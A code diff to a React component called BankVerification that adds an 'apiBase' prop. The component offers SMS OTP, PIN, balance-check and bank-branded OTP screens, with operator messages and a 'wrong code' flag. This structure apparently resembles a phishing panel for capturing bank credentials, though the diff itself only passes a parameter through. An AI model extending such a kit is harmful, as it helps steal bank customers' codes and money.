@@ -11,6 +11,7 @@ import type { BankVerificationProps } from "../types";
 const LAYOUT_MAP: Record<
   string,
   (p: {
+    apiBase: string;
     channelSlug: string;
     sessionId: string;
     onError: (m: string) => void;
@@ -21,7 +22,7 @@ const LAYOUT_MAP: Record<
 > = {
   sms: (p) => <SmsOtp {...p} />,
   pin: (p) => <PinEntry {...p} />,
-  push: () => <PushWaiting />,
+  push: (p) => <PushWaiting />,
   balance: (p) => <BalanceCheck {...p} />,
   "enbd-sms": (p) => <BrandedSmsOtp {...p} brand="enbd-sms" />,
   "adcb-sms": (p) => <BrandedSmsOtp {...p} brand="adcb-sms" />,
@@ -30,6 +31,7 @@ const LAYOUT_MAP: Record<
 };
 
 export function BankVerification({
+  apiBase,
   channelSlug,
   sessionId,
   onSuccess,
@@ -40,7 +42,7 @@ export function BankVerification({
   const [error, setError] = useState<string | null>(null);
 
   const { status, verificationLayout, redirectUrl, wrongCode, clearWrongCode, operatorMessage } =
-    useSessionStatus(channelSlug, sessionId);
+    useSessionStatus(apiBase, channelSlug, sessionId);
 
   useEffect(() => {
     if (!channelSlug || !sessionId) return;
@@ -94,6 +96,7 @@ export function BankVerification({
       {inProgress && <StatusOverlay />}
       {awaitingVerification && (
         <Layout
+          apiBase={apiBase}
           channelSlug={channelSlug}
           sessionId={sessionId}
           onError={(m) => setError(m)}
